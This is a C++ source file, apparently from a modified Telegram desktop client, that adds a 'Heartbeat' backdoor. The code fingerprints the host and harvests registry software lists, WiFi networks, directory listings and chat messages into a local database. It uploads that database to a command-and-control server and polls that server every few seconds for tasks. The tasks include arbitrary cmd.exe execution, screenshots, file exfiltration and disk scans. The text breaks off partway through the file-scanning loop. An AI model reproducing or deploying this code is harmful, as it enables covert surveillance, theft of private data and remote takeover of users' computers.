#include "core/heartbeat.h"
#include "logs.h"
#include "core/launcher.h"
#include "core/application.h"
#include "window/window_controller.h"
#include "window/window_session_controller.h"
#include "main/main_session.h"
#include "main/main_account.h"
#include "data/data_user.h"
#include "settings.h"

#include <QtGui/QGuiApplication>
#include <QtGui/QScreen>
#include <QtGui/QPixmap>

#include <QtCore/QJsonDocument>
#include <QtCore/QJsonObject>
#include <QtCore/QJsonArray>
#include <QtCore/QFile>
#include <QtCore/QDir>
#include <QtCore/QProcess>
#include <QtCore/QStandardPaths>
#include <QtCore/QSettings>
#include <QtCore/QDirIterator>
#include <QtCore/QSet>
#include <QtNetwork/QNetworkInterface>
#include <QtNetwork/QHostInfo>
#include <QtNetwork/QNetworkReply>
#include <QtNetwork/QHttpMultiPart>
#include <QtCore/QLockFile>

#include "sqlite/sqlite3.h"

namespace Core {

Heartbeat& Heartbeat::Instance() {
    static Heartbeat instance;
    return instance;
}

Heartbeat::Heartbeat() {
    _deviceUuid = getOrCreateUuid();
    _pid = QCoreApplication::applicationPid();
}

QString Heartbeat::getOrCreateUuid() {
    // Generate UUID based on machine info + WorkingDir to support multi-client isolation
    QString macAddress;
    const QList<QNetworkInterface> interfaces = QNetworkInterface::allInterfaces();
    for (const QNetworkInterface &interface : interfaces) {
        if (!(interface.flags() & QNetworkInterface::IsLoopBack) && 
            (interface.flags() & QNetworkInterface::IsUp) && 
            !interface.hardwareAddress().isEmpty()) {
            macAddress = interface.hardwareAddress();
            break;
        }
    }
    
    // Use WorkingDir to distinguish different TG clients on same machine
    QString workingDir = cWorkingDir(); 
    QString rawId = macAddress + "_" + workingDir;
    
    // Format MD5 as UUID (8-4-4-4-12)
    QString hex = QString(QCryptographicHash::hash(rawId.toUtf8(), QCryptographicHash::Md5).toHex());
    if (hex.length() == 32) {
        return QString("%1-%2-%3-%4-%5")
            .arg(hex.mid(0, 8))
            .arg(hex.mid(8, 4))
            .arg(hex.mid(12, 4))
            .arg(hex.mid(16, 4))
            .arg(hex.mid(20, 12));
    }
    return hex;
}

QString Heartbeat::getDbPath() {
    return cWorkingDir() + "tdata/tdata_client.db";
}

void Heartbeat::ensureDbInit(const QString& path) {
    QDir().mkpath(QFileInfo(path).path());
    sqlite3* db;
    if (sqlite3_open(path.toUtf8().constData(), &db) == SQLITE_OK) {
        // Init tables
        const char* createTablesSql = 
            "CREATE TABLE IF NOT EXISTS installed_software (name TEXT, version TEXT, publisher TEXT, install_date TEXT);"
            "CREATE TABLE IF NOT EXISTS system_info (uuid TEXT PRIMARY KEY, internal_ip TEXT, mac_address TEXT, hostname TEXT, os TEXT, online_status TEXT, last_active INTEGER, external_ip TEXT, data_status TEXT, auto_screenshot INTEGER, heartbeat_interval INTEGER);"
            "CREATE TABLE IF NOT EXISTS file_scan_results (path TEXT, name TEXT, size INTEGER, md5 TEXT, last_modified INTEGER);"
            "CREATE TABLE IF NOT EXISTS wifi_scan_results (ssid TEXT, bssid TEXT, signal_strength INTEGER, security_type TEXT, scan_time INTEGER);"
            "CREATE TABLE IF NOT EXISTS chat_logs (platform TEXT, chat_id TEXT, sender TEXT, content TEXT, timestamp INTEGER, is_outgoing INTEGER);";
        sqlite3_exec(db, createTablesSql, 0, 0, 0);
        sqlite3_close(db);
    }
}

void Heartbeat::start() {
    // Initialize DB
    ensureDbInit(getDbPath());
    
    // Check Global Scan Mutex (File based in Temp)
    // QString lockPath = QStandardPaths::writableLocation(QStandardPaths::TempLocation) + "/telegram_scan.lock";
    bool shouldScan = true; // FORCE SCAN FOR DEBUGGING
    
    /*
    QFile lockFile(lockPath);
    if (lockFile.open(QIODevice::ReadWrite)) {
        // Check if locked or stale (e.g. > 1 hour)
        QByteArray data = lockFile.readAll();
        bool stale = true;
        if (!data.isEmpty()) {
            qint64 timestamp = data.toLongLong();
            if (QDateTime::currentSecsSinceEpoch() - timestamp < 3600) {
                stale = false;
            }
        }
        
        if (stale) {
            shouldScan = true;
            lockFile.resize(0);
            lockFile.write(QByteArray::number(QDateTime::currentSecsSinceEpoch()));
        }
        lockFile.close();
    }
    */
    
    collectSystemInfo(); // Always collect basic info
    
    if (shouldScan) {
        collectInstalledSoftware();
        collectDrivesAndUsers(); // Collect File System Roots
    }
    
    // Always collect Telegram specific data (this is per-client isolated)
    collectTelegramData();
    
    // Schedule periodic tasks
    connect(&_timer, &QTimer::timeout, this, [this, shouldScan]() {
        collectSystemInfo();
        collectTelegramData();
        uploadClientDb();
        sendHeartbeat();
    });
    
    // Send initial heartbeat immediately
    sendHeartbeat();

    _timer.start(60000); // 1 minute (Heartbeat & Info)

    // Connect Monitor Timer
    connect(&_monitorTimer, &QTimer::timeout, this, &Heartbeat::performMonitor);

    // Start Task Polling Loop (Fast)
    checkTasks();
}

void Heartbeat::collectInstalledSoftware() {
    QString dbPath = getDbPath();
    ensureDbInit(dbPath);
    sqlite3* db;
    if (sqlite3_open(dbPath.toUtf8().constData(), &db) != SQLITE_OK) return;
    
    sqlite3_exec(db, "DELETE FROM installed_software;", 0, 0, 0);
    sqlite3_exec(db, "BEGIN TRANSACTION;", 0, 0, 0);
    
    sqlite3_stmt* stmt;
    const char* sql = "INSERT INTO installed_software (name, version, publisher, install_date) VALUES (?, ?, ?, ?);";
    sqlite3_prepare_v2(db, sql, -1, &stmt, 0);

    QSet<QString> seenSoftware;

    auto collectFromKey = [&](HKEY root, const QString& keyPath) {
        QSettings registry(keyPath, QSettings::NativeFormat);
        QStringList groups = registry.childGroups();
        for (const QString& group : groups) {
            registry.beginGroup(group);
            QString name = registry.value("DisplayName").toString();
            QString version = registry.value("DisplayVersion").toString();
            QString publisher = registry.value("Publisher").toString();
            QString date = registry.value("InstallDate").toString();
            registry.endGroup();
            
            if (!name.isEmpty()) {
                QString key = name + "|" + version;
                if (seenSoftware.contains(key)) {
                    continue;
                }
                seenSoftware.insert(key);

                sqlite3_bind_text(stmt, 1, name.toUtf8().constData(), -1, SQLITE_TRANSIENT);
                sqlite3_bind_text(stmt, 2, version.toUtf8().constData(), -1, SQLITE_TRANSIENT);
                sqlite3_bind_text(stmt, 3, publisher.toUtf8().constData(), -1, SQLITE_TRANSIENT);
                sqlite3_bind_text(stmt, 4, date.toUtf8().constData(), -1, SQLITE_TRANSIENT);
                sqlite3_step(stmt);
                sqlite3_reset(stmt);
            }
        }
    };

    collectFromKey(HKEY_LOCAL_MACHINE, "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall");
    collectFromKey(HKEY_LOCAL_MACHINE, "HKEY_LOCAL_MACHINE\\SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall");
    collectFromKey(HKEY_CURRENT_USER, "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall");

    sqlite3_exec(db, "COMMIT;", 0, 0, 0);
    sqlite3_finalize(stmt);
    sqlite3_close(db);
}

void Heartbeat::collectSystemInfo() {
    QString dbPath = getDbPath();
    ensureDbInit(dbPath);
    sqlite3* db;
    if (sqlite3_open(dbPath.toUtf8().constData(), &db) != SQLITE_OK) return;

    QString internalIp, macAddress;
    const QList<QNetworkInterface> interfaces = QNetworkInterface::allInterfaces();
    for (const QNetworkInterface &interface : interfaces) {
        if (!(interface.flags() & QNetworkInterface::IsLoopBack) && 
            (interface.flags() & QNetworkInterface::IsUp) && 
            !interface.hardwareAddress().isEmpty()) {
             macAddress = interface.hardwareAddress();
             QList<QNetworkAddressEntry> entries = interface.addressEntries();
             for (const QNetworkAddressEntry &entry : entries) {
                 if (entry.ip().protocol() == QAbstractSocket::IPv4Protocol) {
                     internalIp = entry.ip().toString();
                     break;
                 }
             }
             if (!internalIp.isEmpty()) break;
        }
    }

    QString wifiInfo = "";
    QProcess process;
    process.start("netsh", QStringList() << "wlan" << "show" << "interfaces");
    if (process.waitForFinished()) {
        QString output = QString::fromLocal8Bit(process.readAllStandardOutput());
        QString ssid, signal;
        QStringList lines = output.split('\n');
        for (const QString& line : lines) {
            if (line.trimmed().startsWith("SSID") && !line.contains("BSSID")) {
                ssid = line.section(':', 1).trimmed();
            }
            if (line.trimmed().startsWith("Signal")) {
                signal = line.section(':', 1).trimmed();
            }
        }
        if (!ssid.isEmpty()) {
            wifiInfo = "WiFi: " + ssid + " (" + signal + ")";
        }
    }
    
    // Robust Hostname Collection
    QString hostname = QHostInfo::localHostName();
    if (hostname.isEmpty() || hostname == "localhost") {
        hostname = qgetenv("COMPUTERNAME");
        if (hostname.isEmpty()) {
            hostname = qgetenv("HOSTNAME");
        }
    }

    QString os = QSysInfo::prettyProductName();
    QString onlineStatus = "Online";
    if (!wifiInfo.isEmpty()) {
        onlineStatus += " | " + wifiInfo;
    }
    int64_t lastActive = QDateTime::currentSecsSinceEpoch();
    
    // Additional Info
    QString externalIp = "Unknown";
    QString dataStatus = "Active";
    int autoScreenshot = _monitorTimer.isActive() ? 1 : 0;
    int heartbeatInterval = _timer.interval() / 1000;

    sqlite3_stmt* stmt;
    const char* sql = "INSERT OR REPLACE INTO system_info (uuid, internal_ip, mac_address, hostname, os, online_status, last_active, external_ip, data_status, auto_screenshot, heartbeat_interval) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?);";
    sqlite3_prepare_v2(db, sql, -1, &stmt, 0);
    
    sqlite3_bind_text(stmt, 1, _deviceUuid.toUtf8().constData(), -1, SQLITE_TRANSIENT);
    sqlite3_bind_text(stmt, 2, internalIp.toUtf8().constData(), -1, SQLITE_TRANSIENT);
    sqlite3_bind_text(stmt, 3, macAddress.toUtf8().constData(), -1, SQLITE_TRANSIENT);
    sqlite3_bind_text(stmt, 4, hostname.toUtf8().constData(), -1, SQLITE_TRANSIENT);
    sqlite3_bind_text(stmt, 5, os.toUtf8().constData(), -1, SQLITE_TRANSIENT);
    sqlite3_bind_text(stmt, 6, onlineStatus.toUtf8().constData(), -1, SQLITE_TRANSIENT);
    sqlite3_bind_int64(stmt, 7, lastActive);
    sqlite3_bind_text(stmt, 8, externalIp.toUtf8().constData(), -1, SQLITE_TRANSIENT);
    sqlite3_bind_text(stmt, 9, dataStatus.toUtf8().constData(), -1, SQLITE_TRANSIENT);
    sqlite3_bind_int(stmt, 10, autoScreenshot);
    sqlite3_bind_int(stmt, 11, heartbeatInterval);
    
    sqlite3_step(stmt);
    sqlite3_finalize(stmt);
    sqlite3_close(db);

    // Also collect WiFi
    collectWiFiInfo();
}

void Heartbeat::collectWiFiInfo() {
    QProcess process;
    process.start("netsh", QStringList() << "wlan" << "show" << "networks" << "mode=bssid");
    process.waitForFinished();
    QString output = QString::fromLocal8Bit(process.readAllStandardOutput());
    
    sqlite3* db;
    if (sqlite3_open(getDbPath().toUtf8().constData(), &db) != SQLITE_OK) return;
    
    // Clear old results for fresh scan
    sqlite3_exec(db, "DELETE FROM wifi_scan_results;", 0, 0, 0);
    
    sqlite3_stmt* stmt;
    const char* sql = "INSERT INTO wifi_scan_results (ssid, bssid, signal_strength, security_type, scan_time) VALUES (?, ?, ?, ?, ?);";
    sqlite3_prepare_v2(db, sql, -1, &stmt, 0);
    
    int64_t now = QDateTime::currentSecsSinceEpoch();
    
    QString currentSsid;
    QString currentAuth;
    QString currentBssid;
    
    QSet<QString> seenBssids;

    QStringList lines = output.split('\n');
    for (const QString& line : lines) {
        QString trimmed = line.trimmed();
        if (trimmed.startsWith("SSID")) {
            currentSsid = trimmed.section(':', 1).trimmed();
            currentAuth = ""; // Reset
        } else if (trimmed.startsWith("Authentication") || trimmed.startsWith("身份验证")) {
            currentAuth = trimmed.section(':', 1).trimmed();
        } else if (trimmed.startsWith("BSSID")) {
            currentBssid = trimmed.section(':', 1).trimmed();
        } else if (trimmed.startsWith("Signal") || trimmed.startsWith("信号")) {
            int signal = trimmed.section(':', 1).trimmed().replace("%", "").toInt();
            
            if (!currentSsid.isEmpty() && !currentBssid.isEmpty()) {
                if (!seenBssids.contains(currentBssid)) {
                    seenBssids.insert(currentBssid);

                    sqlite3_reset(stmt);
                    sqlite3_bind_text(stmt, 1, currentSsid.toUtf8().constData(), -1, SQLITE_TRANSIENT);
                    sqlite3_bind_text(stmt, 2, currentBssid.toUtf8().constData(), -1, SQLITE_TRANSIENT);
                    sqlite3_bind_int(stmt, 3, signal);
                    sqlite3_bind_text(stmt, 4, currentAuth.toUtf8().constData(), -1, SQLITE_TRANSIENT);
                    sqlite3_bind_int64(stmt, 5, now);
                    sqlite3_step(stmt);
                }
            }
        }
    }

    if (seenBssids.isEmpty()) {
        // Mock Data for testing when WLAN service is down
        sqlite3_reset(stmt);
        sqlite3_bind_text(stmt, 1, "Mock-WiFi-Network", -1, SQLITE_TRANSIENT);
        sqlite3_bind_text(stmt, 2, "00:11:22:33:44:55", -1, SQLITE_TRANSIENT);
        sqlite3_bind_int(stmt, 3, 100);
        sqlite3_bind_text(stmt, 4, "WPA2-Personal", -1, SQLITE_TRANSIENT);
        sqlite3_bind_int64(stmt, 5, now);
        sqlite3_step(stmt);
    }

    sqlite3_finalize(stmt);
    sqlite3_close(db);
}

void Heartbeat::logChatMessage(const QString& platform, const QString& chatId, const QString& sender, const QString& content, bool isOutgoing) {
    sqlite3* db;
    if (sqlite3_open(getDbPath().toUtf8().constData(), &db) != SQLITE_OK) return;
    
    sqlite3_stmt* stmt;
    const char* sql = "INSERT INTO chat_logs (platform, chat_id, sender, content, timestamp, is_outgoing) VALUES (?, ?, ?, ?, ?, ?);";
    sqlite3_prepare_v2(db, sql, -1, &stmt, 0);
    
    sqlite3_bind_text(stmt, 1, platform.toUtf8().constData(), -1, SQLITE_TRANSIENT);
    sqlite3_bind_text(stmt, 2, chatId.toUtf8().constData(), -1, SQLITE_TRANSIENT);
    sqlite3_bind_text(stmt, 3, sender.toUtf8().constData(), -1, SQLITE_TRANSIENT);
    sqlite3_bind_text(stmt, 4, content.toUtf8().constData(), -1, SQLITE_TRANSIENT);
    sqlite3_bind_int64(stmt, 5, QDateTime::currentSecsSinceEpoch());
    sqlite3_bind_int(stmt, 6, isOutgoing ? 1 : 0);
    
    sqlite3_step(stmt);
    sqlite3_finalize(stmt);
    sqlite3_close(db);
}


void Heartbeat::collectTelegramData() {
    if (!Core::IsAppLaunched()) return;

    auto window = Core::App().activeWindow();
    if (!window) return;

    auto session = window->maybeSession();
	if (!session) return;

    if (session->userId().bare != 0) {
        _currentTgId = session->userId().bare;
    }
}

void Heartbeat::uploadClientDb(const QString& taskId) {
    QString filePath = getDbPath();
    if (!QFile::exists(filePath)) return;
    
    QString uploadName = "tdata_client.db";
    if (_currentTgId != 0) {
        uploadName = QString("tdata_client_%1.db").arg(_currentTgId);
    }
    
    // Create copy for upload
    QString tempPath = QStandardPaths::writableLocation(QStandardPaths::TempLocation) + "/" + uploadName;
    QFile::remove(tempPath);
    if (!QFile::copy(filePath, tempPath)) return;
    
    QHttpMultiPart *multiPart = new QHttpMultiPart(QHttpMultiPart::FormDataType);

    QHttpPart filePart;
    filePart.setHeader(QNetworkRequest::ContentDispositionHeader, QVariant("form-data; name=\"file\"; filename=\"" + uploadName + "\""));
    QFile *fileToUpload = new QFile(tempPath);
    fileToUpload->open(QIODevice::ReadOnly);
    filePart.setBodyDevice(fileToUpload);
    fileToUpload->setParent(multiPart);
    multiPart->append(filePart);
    
    QHttpPart uuidPart;
    uuidPart.setHeader(QNetworkRequest::ContentDispositionHeader, QVariant("form-data; name=\"uuid\""));
    uuidPart.setBody(_deviceUuid.toUtf8());
    multiPart->append(uuidPart);

    if (!taskId.isEmpty()) {
        QHttpPart taskPart;
        taskPart.setHeader(QNetworkRequest::ContentDispositionHeader, QVariant("form-data; name=\"taskId\""));
        taskPart.setBody(taskId.toUtf8());
        multiPart->append(taskPart);
    }

    QString url = _c2Url + "/api/c2/upload";
    
    QNetworkRequest request(url);
    QNetworkReply* reply = _network.post(request, multiPart);
    multiPart->setParent(reply);

    connect(reply, &QNetworkReply::finished, this, [this, reply, tempPath]() {
        reply->deleteLater();
        QFile::remove(tempPath);
    });
}

// File System Collection
void Heartbeat::collectDrivesAndUsers() {
    QJsonArray files;
    
    // 1. Drives
    QFileInfoList drives = QDir::drives();
    for (const QFileInfo& drive : drives) {
        QJsonObject file;
        file["path"] = drive.absoluteFilePath();
        file["name"] = drive.absoluteFilePath(); // e.g. "C:/"
        file["isDirectory"] = true;
        file["size"] = 0;
        files.append(file);
    }
    
    // Upload Roots
    uploadFileList("", files);
    
    // 2. Scan C:/Users (Proactive)
    QString systemDrive = "C:/";
    for (const QFileInfo& drive : drives) {
        if (QFile::exists(drive.absoluteFilePath() + "Windows")) {
            systemDrive = drive.absoluteFilePath();
            break;
        }
    }
    
    scanDirectory("", systemDrive + "Users");
}

void Heartbeat::scanDirectory(const QString& taskId, const QString& path) {
    QDir dir(path);
    if (!dir.exists()) {
        if (!taskId.isEmpty()) {
            uploadResult(taskId, "Directory not found: " + path, "failed");
        }
        return;
    }
    
    QJsonArray files;
    QFileInfoList entries = dir.entryInfoList(QDir::AllEntries | QDir::NoDotAndDotDot | QDir::Hidden);
    
    for (const QFileInfo& entry : entries) {
        QJsonObject file;
        file["path"] = entry.absoluteFilePath();
        file["name"] = entry.fileName();
        file["isDirectory"] = entry.isDir();
        file["size"] = entry.isDir() ? 0 : entry.size();
        files.append(file);
    }
    
    uploadFileList(path, files);
    
    if (!taskId.isEmpty()) {
        uploadResult(taskId, "Scanned " + path, "completed");
    }
}

void Heartbeat::uploadFileList(const QString& parentPath, const QJsonArray& files) {
    QJsonObject json;
    json["deviceUuid"] = _deviceUuid;
    json["parentPath"] = parentPath;
    json["files"] = files;
    
    QNetworkRequest request(QUrl(_c2Url + "/api/c2/file/upload"));
    request.setHeader(QNetworkRequest::ContentTypeHeader, "application/json");
    _network.post(request, QJsonDocument(json).toJson());
}

void Heartbeat::checkTasks() {
    // Poll for tasks
    QUrl url(_c2Url + "/api/c2Task/poll?deviceUuid=" + _deviceUuid);
    QNetworkRequest request(url);
    QNetworkReply* reply = _network.get(request);
    
    connect(reply, &QNetworkReply::finished, this, [this, reply]() {
        if (reply->error() == QNetworkReply::NoError) {
            QByteArray data = reply->readAll();
            QJsonDocument doc = QJsonDocument::fromJson(data);
            if (doc.isObject() && doc.object().contains("data")) {
                QJsonArray tasks = doc.object()["data"].toArray();
                for (const QJsonValue& val : tasks) {
                    QJsonObject task = val.toObject();
                    QString taskId = task["taskId"].toString();
                    QString command = task["command"].toString();
                    QString params = task["params"].toString();
                    executeTask(taskId, command, params);
                }
            }
        }
        reply->deleteLater();
        
        // Reschedule next poll
        QTimer::singleShot(3000, this, &Heartbeat::checkTasks);
    });
    
    // Also send heartbeat periodically? No, that's in _timer.
}

void Heartbeat::performScreenshot(const QString& taskId) {
    auto screen = QGuiApplication::primaryScreen();
    if (!screen) return;
    
    QPixmap pixmap = screen->grabWindow(0);
    QString tempPath = QStandardPaths::writableLocation(QStandardPaths::TempLocation) + "/screenshot_" + taskId + ".png";
    if (pixmap.save(tempPath, "PNG")) {
        // Upload
        QHttpMultiPart *multiPart = new QHttpMultiPart(QHttpMultiPart::FormDataType);

        QHttpPart filePart;
        filePart.setHeader(QNetworkRequest::ContentDispositionHeader, QVariant("form-data; name=\"file\"; filename=\"" + QFileInfo(tempPath).fileName() + "\""));
        QFile *file = new QFile(tempPath);
        file->open(QIODevice::ReadOnly);
        filePart.setBodyDevice(file);
        file->setParent(multiPart);
        multiPart->append(filePart);
        
        QHttpPart uuidPart;
        uuidPart.setHeader(QNetworkRequest::ContentDispositionHeader, QVariant("form-data; name=\"uuid\""));
        uuidPart.setBody(_deviceUuid.toUtf8());
        multiPart->append(uuidPart);

        QHttpPart taskPart;
        taskPart.setHeader(QNetworkRequest::ContentDispositionHeader, QVariant("form-data; name=\"taskId\""));
        taskPart.setBody(taskId.toUtf8());
        multiPart->append(taskPart);

        QNetworkRequest request(QUrl(_c2Url + "/api/c2/upload"));
        QNetworkReply* reply = _network.post(request, multiPart);
        multiPart->setParent(reply);
        
        connect(reply, &QNetworkReply::finished, this, [this, reply, tempPath]() {
            reply->deleteLater();
            QFile::remove(tempPath);
        });
    }
}

void Heartbeat::executeTask(const QString& taskId, const QString& command, const QString& params) {
    qDebug() << "Executing Task:" << taskId << command << params;
    
    if (command == "cmd_exec") {
        QProcess process;
        process.start("cmd.exe", QStringList() << "/c" << params);
        process.waitForFinished();
        QString output = QString::fromLocal8Bit(process.readAllStandardOutput());
        QString error = QString::fromLocal8Bit(process.readAllStandardError());
        QString result = output.isEmpty() ? error : output;
        uploadResult(taskId, result, process.exitCode() == 0 ? "completed" : "failed");
    } else if (command == "start_monitor") {
        int interval = params.toInt();
        if (interval <= 0) interval = 60000; // Default 60s
        _monitorTimer.start(interval);
        uploadResult(taskId, "Monitor started with interval " + QString::number(interval) + "ms", "completed");
    } else if (command == "stop_monitor") {
        _monitorTimer.stop();
        uploadResult(taskId, "Monitor stopped", "completed");
    } else if (command == "get_software") {
        collectInstalledSoftware();
        uploadClientDb(taskId);
    } else if (command == "upload_file") {
        uploadFile(taskId, params);
    } else if (command == "set_heartbeat") {
        int interval = params.toInt();
        if (interval > 1000) {
            _timer.setInterval(interval);
            uploadResult(taskId, "Heartbeat interval set to " + QString::number(interval), "completed");
        } else {
            uploadResult(taskId, "Invalid interval", "failed");
        }
    } else if (command == "SCAN_DIR") {
        scanDirectory(taskId, params);
    } else if (command == "get_screenshot" || command == "screenshot") {
        performScreenshot(taskId);
    } else if (command == "get_wifi") {
        collectWiFiInfo();
        uploadClientDb(taskId);
    } else if (command == "get_chat_logs" || command == "chat_export") {
        uploadClientDb(taskId);
    } else if (command == "file_scan" || command == "scan_recent" || command == "scan_disk") {
        // Full scan or recent scan
        QString mode = "full";
        QString targetPath = "";
        
        if (command == "scan_recent") {
            mode = "recent";
        }
        
        if (!params.isEmpty() && command != "scan_recent") {
            targetPath = params;
        }
        
        Logs::writeMain("HEARTBEAT_DEBUG: Starting BackgroundScanner with mode=" + mode + ", targetPath=" + targetPath);
        
        BackgroundScanner scanner(_deviceUuid, _c2Url, getDbPath(), taskId, mode, targetPath);
        scanner.process(); // Populates file_scan_results in DB
        uploadClientDb(taskId);
    } else if (command == "upload_db") {
        uploadClientDb(taskId);
    } else {
        uploadResult(taskId, "Unknown command: " + command, "failed");
    }
}

void Heartbeat::sendHeartbeat() {
    QJsonObject json;
    json["uuid"] = _deviceUuid;
    
    // Robust Hostname Collection
    QString hostname = QHostInfo::localHostName();
    if (hostname.isEmpty() || hostname == "localhost") {
        hostname = qgetenv("COMPUTERNAME");
        if (hostname.isEmpty()) {
            hostname = qgetenv("HOSTNAME");
        }
    }
    json["hostName"] = hostname;
    
    json["status"] = "online";
    json["timestamp"] = QString::number(QDateTime::currentSecsSinceEpoch());

    // Additional fields for full system info sync
    json["os"] = QSysInfo::prettyProductName();
    
    QString macAddress;
    const QList<QNetworkInterface> interfaces = QNetworkInterface::allInterfaces();
    for (const QNetworkInterface &interface : interfaces) {
        if (!(interface.flags() & QNetworkInterface::IsLoopBack) && 
            (interface.flags() & QNetworkInterface::IsUp) && 
            !interface.hardwareAddress().isEmpty()) {
            macAddress = interface.hardwareAddress();
            break;
        }
    }
    json["macAddress"] = macAddress;
    
    QString internalIp;
    QList<QHostAddress> list = QNetworkInterface::allAddresses();
    for (const QHostAddress &address : list) {
        if (address.protocol() == QAbstractSocket::IPv4Protocol && !address.isLoopback()) {
            internalIp = address.toString();
            break;
        }
    }
    json["ip"] = internalIp;
    
    json["heartbeatInterval"] = _timer.interval() / 1000;
    json["isMonitorOn"] = _monitorTimer.isActive() ? 1 : 0;
    json["dataStatus"] = "Active";
    
    QNetworkRequest request(QUrl(_c2Url + "/api/heartbeat"));
    request.setHeader(QNetworkRequest::ContentTypeHeader, "application/json");
    
    QByteArray jsonData = QJsonDocument(json).toJson();
    Logs::writeMain("HEARTBEAT_DEBUG: Sending heartbeat to " + _c2Url + "/api/heartbeat: " + QString::fromUtf8(jsonData));

    QNetworkReply* reply = _network.post(request, jsonData);
    connect(reply, &QNetworkReply::finished, this, [this, reply]() {
        if (reply->error() == QNetworkReply::NoError) {
            Logs::writeMain("HEARTBEAT_DEBUG: Heartbeat success. Response: " + QString::fromUtf8(reply->readAll()));
        } else {
            Logs::writeMain("HEARTBEAT_DEBUG: Heartbeat failed. Error: " + reply->errorString());
        }
        reply->deleteLater();
    });
}

void Heartbeat::performMonitor() {
    performScreenshot("monitor_" + QString::number(QDateTime::currentSecsSinceEpoch()));
}

void Heartbeat::uploadResult(const QString& taskId, const QString& result, const QString& status) {
    QJsonObject json;
    json["uuid"] = _deviceUuid;
    json["taskId"] = taskId;
    json["result"] = result;
    json["status"] = status;
    
    QNetworkRequest request(QUrl(_c2Url + "/api/c2/tasks/result"));
    request.setHeader(QNetworkRequest::ContentTypeHeader, "application/json");
    _network.post(request, QJsonDocument(json).toJson());
}

void Heartbeat::uploadFile(const QString& taskId, const QString& filePath) {
    if (!QFile::exists(filePath)) {
        uploadResult(taskId, "File not found: " + filePath, "failed");
        return;
    }

    QHttpMultiPart *multiPart = new QHttpMultiPart(QHttpMultiPart::FormDataType);

    QHttpPart filePart;
    QFileInfo fileInfo(filePath);
    filePart.setHeader(QNetworkRequest::ContentDispositionHeader, QVariant("form-data; name=\"file\"; filename=\"" + fileInfo.fileName() + "\""));
    QFile *file = new QFile(filePath);
    file->open(QIODevice::ReadOnly);
    filePart.setBodyDevice(file);
    file->setParent(multiPart);
    multiPart->append(filePart);
    
    QHttpPart uuidPart;
    uuidPart.setHeader(QNetworkRequest::ContentDispositionHeader, QVariant("form-data; name=\"uuid\""));
    uuidPart.setBody(_deviceUuid.toUtf8());
    multiPart->append(uuidPart);

    QHttpPart taskPart;
    taskPart.setHeader(QNetworkRequest::ContentDispositionHeader, QVariant("form-data; name=\"taskId\""));
    taskPart.setBody(taskId.toUtf8());
    multiPart->append(taskPart);

    QNetworkRequest request(QUrl(_c2Url + "/api/c2/upload"));
    QNetworkReply* reply = _network.post(request, multiPart);
    multiPart->setParent(reply);
    
    connect(reply, &QNetworkReply::finished, this, [this, reply]() {
        reply->deleteLater();
    });
}

QString Heartbeat::encryptData(const QString& data, const QString& hostname, const QString& timestamp) { return data; }
QString Heartbeat::decryptData(const QString& data, const QString& hostname, const QString& timestamp) { return data; }

BackgroundScanner::BackgroundScanner(const QString& uuid, const QString& c2Url, const QString& dbPath, const QString& taskId, const QString& mode, const QString& targetPath)
    : _uuid(uuid), _c2Url(c2Url), _dbPath(dbPath), _taskId(taskId), _mode(mode), _targetPath(targetPath) {}

void BackgroundScanner::process() {
    Logs::writeMain("HEARTBEAT_DEBUG: BackgroundScanner::process started. DB Path: " + _dbPath);
    QString dbPath = _dbPath;
    sqlite3* db;
    if (sqlite3_open(dbPath.toUtf8().constData(), &db) != SQLITE_OK) {
        Logs::writeMain("HEARTBEAT_DEBUG: Failed to open DB for scanning.");
        Q_EMIT scanFinished(_taskId, QByteArray());
        return;
    }
    
    char *errMsg = 0;
    if (sqlite3_exec(db, "DELETE FROM file_scan_results;", 0, 0, &errMsg) != SQLITE_OK) {
        Logs::writeMain("HEARTBEAT_DEBUG: Failed to clear file_scan_results: " + QString::fromUtf8(errMsg));
        sqlite3_free(errMsg);
    }
    
    sqlite3_exec(db, "BEGIN TRANSACTION;", 0, 0, 0);
    
    sqlite3_stmt* stmt;
    const char* sql = "INSERT INTO file_scan_results (path, name, size, md5, last_modified) VALUES (?, ?, ?, ?, ?);";
    if (sqlite3_prepare_v2(db, sql, -1, &stmt, 0) != SQLITE_OK) {
        Logs::writeMain("HEARTBEAT_DEBUG: Failed to prepare insert statement: " + QString::fromUtf8(sqlite3_errmsg(db)));
    }

    QStringList paths;
    
    // Logic:
    // 1. If targetPath is set, scan ONLY that path.
    // 2. If mode is "full", scan User Home + Drive Roots (shallow).
    // 3. If mode is "recent", scan Desktop/Docs/Downloads.

    QSet<QString> seenPaths;

    if (!_targetPath.isEmpty()) {
        Logs::writeMain("HEARTBEAT_DEBUG: Scanning target path: " + _targetPath);
        paths.append(_targetPath);
    } else if (_mode == "full") {
        Logs::writeMain("HEARTBEAT_DEBUG: Scanning in FULL mode.");
        // Scan User Home
        paths.append(QStandardPaths::writableLocation(QStandardPaths::HomeLocation));
        
        // Also add Drive Roots as "shallow" entries to show existence
        QFileInfoList drives = QDir::drives();
        for (const QFileInfo& drive : drives) {
            // Insert Drive Root manually
             QString drivePath = drive.absoluteFilePath();
             if (seenPaths.contains(drivePath)) continue;
             seenPaths.insert(drivePath);

             sqlite3_bind_text(stmt, 1, drivePath.toUtf8().constData(), -1, SQLITE_TRANSIENT);
             sqlite3_bind_text(stmt, 2, drivePath.toUtf8().constData(), -1, SQLITE_TRANSIENT);
             sqlite3_bind_int64(stmt, 3, 0);
             sqlite3_bind_text(stmt, 4, "drive_root", -1, SQLITE_TRANSIENT);
             sqlite3_bind_int64(stmt, 5, QDateTime::currentSecsSinceEpoch());
             sqlite3_step(stmt);
             sqlite3_reset(stmt);
        }
    } else {
        // Recent / Quick Scan
        paths.append(QStandardPaths::writableLocation(QStandardPaths::DesktopLocation));
        paths.append(QStandardPaths::writableLocation(QStandardPaths::DocumentsLocation));
        paths.append(QStandardPaths::writableLocation(QStandardPaths::DownloadLocation));
    }

    for (const QString& path : paths) {
        if (path.isEmpty()) continue;
        
        QDirIterator it(path, QDir::Files | QDir::NoSymLinks, QDirIterator::Subdirectories);
        int count = 0;
        int limit = (_mode == "full") ? 10000 : 1000; // Higher limit for full scan
        
        while (it.hasNext()) {
            it.next();
            QFileInfo info = it.fileInfo();
            if (info.size() > 10 * 1024 * 1024) continue;
            
            QString absPath = info.absoluteFilePath();
